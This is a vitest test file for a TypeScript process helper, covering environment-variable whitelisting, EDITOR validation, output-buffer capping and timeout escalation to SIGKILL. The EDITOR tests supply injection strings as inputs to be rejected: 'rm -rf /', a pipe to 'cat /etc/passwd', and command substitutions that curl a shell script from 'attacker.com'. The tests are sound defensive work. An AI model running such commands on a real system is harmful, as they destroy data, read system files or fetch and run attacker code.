import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { buildSafeEnv, capBuffer, MAX_OUTPUT, resolveEditor, spawnAsync, SIGKILL_DELAY_MS } from "./process";

describe("buildSafeEnv", () => {
	it("includes whitelisted env vars", () => {
		const env = buildSafeEnv();
		// PATH should always be present in the environment
		expect(env.PATH).toBeDefined();
	});

	it("excludes non-whitelisted env vars", () => {
		// Set a non-whitelisted var
		process.env.SUPER_SECRET_KEY = "secret";
		const env = buildSafeEnv();
		expect(env.SUPER_SECRET_KEY).toBeUndefined();
		delete process.env.SUPER_SECRET_KEY;
	});

	it("applies overrides on top", () => {
		const env = buildSafeEnv({ ANTHROPIC_API_KEY: "test-key" });
		expect(env.ANTHROPIC_API_KEY).toBe("test-key");
	});

	it("overrides can override whitelisted keys", () => {
		const env = buildSafeEnv({ PATH: "/custom/path" });
		expect(env.PATH).toBe("/custom/path");
	});
});

describe("resolveEditor", () => {
	let savedEditor: string | undefined;
	let warnSpy: ReturnType<typeof vi.spyOn>;

	beforeEach(() => {
		savedEditor = process.env.EDITOR;
		warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
	});

	afterEach(() => {
		if (savedEditor === undefined) {
			delete process.env.EDITOR;
		} else {
			process.env.EDITOR = savedEditor;
		}
		warnSpy.mockRestore();
	});

	it("returns 'vi' when EDITOR is unset", () => {
		delete process.env.EDITOR;
		expect(resolveEditor()).toBe("vi");
	});

	it("returns valid editor name", () => {
		process.env.EDITOR = "vim";
		expect(resolveEditor()).toBe("vim");
		expect(warnSpy).not.toHaveBeenCalled();
	});

	it("extracts basename from absolute path", () => {
		process.env.EDITOR = "/usr/bin/vim";
		expect(resolveEditor()).toBe("vim");
		expect(warnSpy).not.toHaveBeenCalled();
	});

	it("falls back to vi for unknown editor", () => {
		process.env.EDITOR = "rm -rf /";
		expect(resolveEditor()).toBe("vi");
		expect(warnSpy).toHaveBeenCalled();
	});

	it("rejects shell metacharacters", () => {
		process.env.EDITOR = "vim; malicious";
		expect(resolveEditor()).toBe("vi");
		expect(warnSpy).toHaveBeenCalledWith(
			expect.stringContaining("shell metacharacters"),
		);
	});

	it("rejects pipe injection", () => {
		process.env.EDITOR = "vim | cat /etc/passwd";
		expect(resolveEditor()).toBe("vi");
		expect(warnSpy).toHaveBeenCalled();
	});

	it("rejects backtick injection", () => {
		process.env.EDITOR = "`curl attacker.com/shell.sh`";
		expect(resolveEditor()).toBe("vi");
		expect(warnSpy).toHaveBeenCalled();
	});

	it("rejects command substitution", () => {
		process.env.EDITOR = "$(curl attacker.com/shell.sh)";
		expect(resolveEditor()).toBe("vi");
		expect(warnSpy).toHaveBeenCalled();
	});

	it("accepts all allowed editors", () => {
		const allowed = ["vi", "vim", "nvim", "nano", "emacs", "code", "subl", "mate", "micro", "hx", "helix", "kate", "gedit"];
		for (const editor of allowed) {
			process.env.EDITOR = editor;
			expect(resolveEditor()).toBe(editor);
		}
	});
});

describe("capBuffer", () => {
	it("returns not truncated for empty chunks", () => {
		const chunks: Buffer[] = [];
		const result = capBuffer(chunks, 0);
		expect(result.truncated).toBe(false);
		expect(result.len).toBe(0);
		expect(result.chunks).toEqual([]);
	});

	it("returns not truncated when total length is under limit", () => {
		const chunks = [Buffer.alloc(100, "a"), Buffer.alloc(100, "b")];
		const result = capBuffer(chunks, 200);
		expect(result.truncated).toBe(false);
		expect(result.len).toBe(200);
		expect(result.chunks).toHaveLength(2);
	});

	it("returns not truncated when total length equals MAX_OUTPUT", () => {
		const chunks = [Buffer.alloc(MAX_OUTPUT, "a")];
		const result = capBuffer(chunks, MAX_OUTPUT);
		expect(result.truncated).toBe(false);
		expect(result.len).toBe(MAX_OUTPUT);
	});

	it("truncates by dropping leading chunks when multiple chunks exceed limit", () => {
		// Two 5KB chunks → total 10KB, exceeds 8KB
		const chunk1 = Buffer.alloc(5120, "a");
		const chunk2 = Buffer.alloc(5120, "b");
		const chunks = [chunk1, chunk2];
		const result = capBuffer(chunks, 10240);
		expect(result.truncated).toBe(true);
		// chunk1 dropped; chunk2 (5KB) ≤ MAX_OUTPUT so loop stops
		expect(result.chunks).toHaveLength(1);
		expect(result.chunks[0]).toBe(chunk2);
		expect(result.len).toBe(5120);
	});

	it("truncates a single oversized chunk to the last MAX_OUTPUT bytes", () => {
		const data = Buffer.allocUnsafe(MAX_OUTPUT * 2);
		data.fill(0x41, 0, MAX_OUTPUT);      // first half: 'A'
		data.fill(0x42, MAX_OUTPUT);          // second half: 'B'
		const chunks = [data];
		const result = capBuffer(chunks, data.length);
		expect(result.truncated).toBe(true);
		expect(result.len).toBe(MAX_OUTPUT);
		expect(result.chunks[0].length).toBe(MAX_OUTPUT);
		// Kept bytes should be the trailing 'B' half
		expect(result.chunks[0].every((b) => b === 0x42)).toBe(true);
	});

	it("drains leading chunks until total len fits within MAX_OUTPUT", () => {
		// Four 3KB chunks → 12KB total.
		// Loop drops from front while len > MAX_OUTPUT AND chunks.length > 1:
		//   drop chunk[0]: len = 9216 (still > 8192, keep going)
		//   drop chunk[1]: len = 6144 (≤ 8192, stop)
		// Result: two trailing chunks remaining.
		const makeChunk = (fill: number) => Buffer.alloc(3072, fill);
		const chunks = [makeChunk(1), makeChunk(2), makeChunk(3), makeChunk(4)];
		const result = capBuffer(chunks, 3072 * 4);
		expect(result.truncated).toBe(true);
		expect(result.chunks).toHaveLength(2);
		expect(result.chunks[0].every((b) => b === 3)).toBe(true);
		expect(result.chunks[1].every((b) => b === 4)).toBe(true);
	});

	it("mutates the input chunks array in place", () => {
		const chunk1 = Buffer.alloc(5000, "x");
		const chunk2 = Buffer.alloc(5000, "y");
		const chunks = [chunk1, chunk2];
		capBuffer(chunks, 10000);
		// chunk1 should have been shifted out
		expect(chunks).toHaveLength(1);
	});
});

describe("spawnAsync output capping", () => {
	const TRUNCATION_PREFIX = "[Output truncated to last 8KB]\n";

	it("does not truncate output under 8KB", async () => {
		const result = await spawnAsync("node", ["-e", "process.stdout.write('A'.repeat(100))"]);
		expect(result.stdout).toBe("A".repeat(100));
		expect(result.stdout).not.toContain("[Output truncated");
	});

	it("truncates stdout exceeding 8KB with prefix", async () => {
		const result = await spawnAsync("node", ["-e", "process.stdout.write('A'.repeat(16384))"]);
		expect(result.stdout).toContain(TRUNCATION_PREFIX);
		expect(result.stdout.length).toBeLessThanOrEqual(8192 + TRUNCATION_PREFIX.length);
	});

	it("truncates stderr exceeding 8KB with prefix", async () => {
		const result = await spawnAsync("node", ["-e", "process.stderr.write('B'.repeat(16384))"]);
		expect(result.stderr).toContain(TRUNCATION_PREFIX);
		expect(result.stderr.length).toBeLessThanOrEqual(8192 + TRUNCATION_PREFIX.length);
	});

	it("keeps trailing bytes when truncating", async () => {
		const result = await spawnAsync("node", [
			"-e",
			"process.stdout.write('A'.repeat(8000) + 'Z'.repeat(1000))",
		]);
		expect(result.stdout).toContain(TRUNCATION_PREFIX);
		expect(result.stdout).toContain("Z".repeat(1000));
	});
});

describe("spawnAsync SIGKILL escalation", () => {
	it("sends SIGKILL when process ignores SIGTERM", async () => {
		const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

		// Spawn a process that traps SIGTERM and stays alive
		const script = `
			process.on('SIGTERM', () => {});
			setInterval(() => {}, 1000);
		`;

		await expect(
			spawnAsync("node", ["-e", script], { timeout: 100, sigkillDelay: 200 }),
		).rejects.toThrow("Process timed out");

		expect(warnSpy).toHaveBeenCalledWith(
			expect.stringContaining("sending SIGKILL"),
		);
		warnSpy.mockRestore();
	});

	it("does not send SIGKILL when process exits after SIGTERM", async () => {
		const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});

		// Spawn a process that exits normally on SIGTERM (default behavior)
		const script = "setInterval(() => {}, 1000);";

		await expect(
			spawnAsync("node", ["-e", script], { timeout: 100, sigkillDelay: 200 }),
		).rejects.toThrow("Process timed out");

		// Process should exit from SIGTERM before SIGKILL timer fires
		expect(warnSpy).not.toHaveBeenCalledWith(
			expect.stringContaining("sending SIGKILL"),
		);
		warnSpy.mockRestore();
	});

	it("exports SIGKILL_DELAY_MS constant", () => {
		expect(SIGKILL_DELAY_MS).toBe(10_000);
	});
});
